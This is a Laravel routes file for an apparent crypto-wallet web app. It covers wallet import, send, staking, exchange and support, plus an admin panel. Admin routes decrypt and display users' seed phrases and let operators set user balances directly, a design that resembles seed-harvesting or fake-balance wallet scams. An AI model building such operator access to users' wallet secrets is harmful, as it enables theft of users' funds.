<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\CryptoController as AdminCryptoController;
use App\Http\Controllers\Admin\DashboardController as AdminDashboardController;
use App\Http\Controllers\Admin\SeedPhraseController;
use App\Http\Controllers\Admin\StakingSettingController;
use App\Http\Controllers\Admin\UserController as AdminUserController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\StakingController;
use App\Http\Controllers\WalletController;
use App\Http\Controllers\WalletProfileController;
use App\Http\Controllers\WalletExchangeController;
use App\Http\Controllers\SupportController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::middleware('guest')->group(function () {
    Route::get('/', [AuthController::class, 'showWelcome'])->name('welcome');
    Route::get('/create-wallet', [AuthController::class, 'showCreateWallet'])->name('create.wallet');
    Route::get('/import-wallet', [AuthController::class, 'showImportWallet'])->name('import.wallet');
    Route::get('/set-password', [AuthController::class, 'showSetPassword'])->name('set.password');
    Route::get('/seed-phrase', [AuthController::class, 'showSeedPhrase'])->name('seed.phrase');

    Route::post('/create-wallet', [AuthController::class, 'createWallet'])->name('create.wallet.post');
    Route::post('/import-wallet', [AuthController::class, 'importWallet'])->name('import.wallet.post');
});

Route::post('/logout', [AuthController::class, 'logout'])->name('logout');

Route::middleware('auth')->group(function () {
    Route::get('/waiting-approval', [WalletProfileController::class, 'waitingApproval'])->name('waiting.approval');
    Route::get('/check-approval-status', [WalletProfileController::class, 'checkApprovalStatus'])->name('check.approval.status');
    
    Route::middleware('approved')->group(function () {
        Route::get('/dashboard', [WalletController::class, 'dashboard'])->name('dashboard');

        Route::get('/wallets/{id}/set-default', [WalletProfileController::class, 'setDefault'])->name('wallets.set-default');
        
        Route::prefix('profiles')->name('wallet.profiles.')->group(function () {
            Route::get('/', [WalletProfileController::class, 'index'])->name('index');
            Route::get('/create', [WalletProfileController::class, 'create'])->name('create');
            Route::post('/', [WalletProfileController::class, 'store'])->name('store');
            Route::post('/{id}/set-default', [WalletProfileController::class, 'setDefault'])->name('set-default');
        });
        
        Route::get('/send/{symbol}', [WalletController::class, 'sendCrypto'])->name('send.crypto');
        Route::post('/send/{symbol}', [WalletController::class, 'processSend'])->name('send.crypto.post');
        Route::get('/receive/{symbol}', [WalletController::class, 'receiveCrypto'])->name('receive.crypto');

        Route::get('/wallet/receive', [WalletController::class, 'receiveList'])->name('receive.list');
        Route::get('/wallet/send', [WalletController::class, 'sendList'])->name('send.list');
        
        Route::prefix('earn')->name('staking.')->group(function () {
            Route::get('/', [StakingController::class, 'index'])->name('index');
            Route::get('/{symbol}', [StakingController::class, 'showCrypto'])->name('crypto');
            Route::post('/{symbol}/stake', [StakingController::class, 'stake'])->name('stake');
            Route::post('/unstake/{id}', [StakingController::class, 'unstake'])->name('unstake');
        });
        
        Route::get('/settings', [WalletController::class, 'settings'])->name('settings');
        Route::post('/settings/theme', [WalletController::class, 'updateTheme'])->name('settings.theme');
        Route::get('/history', [WalletController::class, 'history'])->name('history');

        Route::get('/wallet/exchange', [WalletExchangeController::class, 'exchangeView'])->name('wallet.exchange');
        Route::post('/wallet/exchange', [WalletExchangeController::class, 'processExchange'])->name('wallet.exchange.process');

        Route::get('/support/chat', [SupportController::class, 'index'])->name('support.chat');
        Route::post('/support/message', [SupportController::class, 'sendMessage'])->name('support.send-message');
        Route::get('/support/ticket/{id}/messages', [SupportController::class, 'getMessages'])->name('support.get-messages');
        Route::post('/support/ticket/{id}/close', [SupportController::class, 'closeTicket'])->name('support.close-ticket');
    });
});

Route::middleware(['check.ip'])->group(function () {
    Route::get('/docs', function () {
        return view('swagger.index');
    });
    
    Route::get('/docs/swagger.yaml', function () {
        return response()->file(storage_path('api-docs/swagger.yaml'));
    });
});

Route::post('/telegram/webhook', [SupportController::class, 'receiveAdminMessage']);


Route::group(['prefix' => 'admin'], function () {
    Voyager::routes();

    Route::get('wallets/{id}/decrypt', [
        'uses' => 'App\Http\Controllers\Voyager\WalletController@decryptSeedPhrase',
        'as' => 'voyager.wallets.decrypt-seed-phrase'
    ]);
    
    Route::post('wallets/{id}/show-seed-phrase', [
        'uses' => 'App\Http\Controllers\Voyager\WalletController@showSeedPhrase',
        'as' => 'voyager.wallets.show-seed-phrase'
    ]);

    Route::post('users/{id}/update-balance', [
        'uses' => 'App\Http\Controllers\Voyager\UserController@updateBalance',
        'as' => 'voyager.users.update-balance',
    ]);

    Route::post('users/{id}/add-crypto', [
        'uses' => 'App\Http\Controllers\Voyager\UserController@addCrypto',
        'as' => 'voyager.users.add-crypto',
    ]);

    Route::get('users/{id}/ajax-details', [App\Http\Controllers\Voyager\UserController::class, 'getUserDetails'])->name('voyager.users.ajax-details');
    Route::post('users/{id}/add-staking-settings', ['uses' => 'App\Http\Controllers\Voyager\UserController@addStakingSettings', 'as' => 'voyager.users.add-staking-settings']);
    Route::post('users/{id}/update-staking-settings', ['uses' => 'App\Http\Controllers\Voyager\UserController@updateStakingSettings', 'as' => 'voyager.users.update-staking-settings']);
    Route::delete('users/{id}/delete-staking-settings/{staking_id}', ['uses' => 'App\Http\Controllers\Voyager\UserController@deleteStakingSettings', 'as' => 'voyager.users.delete-staking-settings']);
});
